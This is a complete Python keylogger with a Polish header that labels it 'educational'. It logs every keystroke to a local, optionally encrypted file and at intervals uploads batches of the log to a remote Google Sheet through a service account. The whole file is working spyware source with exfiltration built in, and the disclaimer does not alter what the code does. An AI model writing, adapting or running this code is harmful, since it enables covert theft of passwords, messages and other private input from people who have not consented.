"""
EDUKACYJNY KEYLOGGER  🕵️
• loguje naciśnięcia klawiszy do pliku 
• co określony czas / liczbę klawiszy wysyła porcję logu do Google Sheets

Autor: Mateusz Połacik
Repo:  https://github.com/<twoje-repo>

!!! PROJEKT WYŁĄCZNIE DO CELÓW EDUKACYJNYCH !!!
"""

import os
import time
import threading
from datetime import datetime
from pathlib import Path
from typing import List

from pynput import keyboard
from google.oauth2.service_account import Credentials
import gspread

from dotenv import load_dotenv
from cryptography.fernet import Fernet, InvalidToken
from colorlog import ColoredFormatter, getLogger

# ───────────────────────────────────────────── setup logger
handler_format = "%(log_color)s[%(levelname)s]%(reset)s %(message)s"
formatter = ColoredFormatter(handler_format)
logger = getLogger("keylogger")
logger.setLevel("INFO")
handler = __import__("logging").StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)

# ───────────────────────────────────────────── env / config
load_dotenv()  # wczytaj .env

SERVICE_ACCOUNT_FILE = os.getenv("SERVICE_ACCOUNT_FILE", "service_account.json")
SPREADSHEET_ID       = os.getenv("SPREADSHEET_ID")
WORKSHEET_NAME       = os.getenv("WORKSHEET_NAME", "Arkusz1")

DURATION_S           = int(os.getenv("DURATION_S", 60))
FLUSH_EVERY_N_KEYS   = int(os.getenv("FLUSH_EVERY_N_KEYS", 10))
FLUSH_EVERY_SEC      = int(os.getenv("FLUSH_EVERY_SEC", 30))

LOG_FILE             = Path(os.getenv("LOG_FILE", "keylog.txt"))
FERNET_KEY           = os.getenv("FERNET_KEY")  # pusty = brak szyfrowania
fernet = Fernet(FERNET_KEY) if FERNET_KEY else None

# ───────────────────────────────────────────── google sheets
def get_worksheet():
    scopes = [
        "https://www.googleapis.com/auth/spreadsheets",
        "https://www.googleapis.com/auth/drive",
    ]
    creds = Credentials.from_service_account_file(SERVICE_ACCOUNT_FILE, scopes=scopes)
    client = gspread.authorize(creds)
    return client.open_by_key(SPREADSHEET_ID).worksheet(WORKSHEET_NAME)

try:
    worksheet = get_worksheet()
except Exception as e:
    logger.error(f"Nie można połączyć z Google Sheets → {e}")
    worksheet = None

# ───────────────────────────────────────────── key buffer
buffer: List[str] = []
buffer_lock = threading.Lock()
last_flush_ts = time.time()

def _encrypt(data: str) -> bytes:
    return fernet.encrypt(data.encode()) if fernet else data

def _write_local(data: str):
    mode, payload = ("ab", _encrypt(data)) if fernet else ("a", data)
    with LOG_FILE.open(mode) as f:
        f.write(payload)

def flush_buffer():
    global buffer, last_flush_ts
    with buffer_lock:
        if not buffer:
            return
        text = "".join(buffer)
        ts = datetime.utcnow().isoformat(sep=" ", timespec="seconds")
        line = f"{ts}\t{text}\n"

        # → lokalny plik
        _write_local(line)

        # → google sheets
        if worksheet:
            try:
                worksheet.append_row([ts, text], value_input_option="RAW")
            except Exception as err:
                logger.warning(f"Błąd wysyłki do Sheets: {err}")

        buffer.clear()
        last_flush_ts = time.time()
        logger.debug(f"Flush OK ({len(text)} znaków)")

def on_press(key):
    global buffer
    special = {
        "Key.space": " ",
        "Key.enter": "\n",
        "Key.tab": "\t",
    }
    k = str(key).replace("'", "")
    char = special.get(k, f"[{k}]" if "Key." in k else k)

    with buffer_lock:
        buffer.append(char)

    # warunek spustowy
    if (
        len(buffer) >= FLUSH_EVERY_N_KEYS
        or time.time() - last_flush_ts >= FLUSH_EVERY_SEC
    ):
        flush_buffer()

def stop_keylogger():
    logger.info("⏹️  Koniec – minęło %s s.", DURATION_S)
    flush_buffer()
    listener.stop()

# ───────────────────────────────────────────── main loop
if __name__ == "__main__":
    logger.info("▶️  Keylogger start – działa %s s…", DURATION_S)
    timer = threading.Timer(DURATION_S, stop_keylogger)
    timer.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()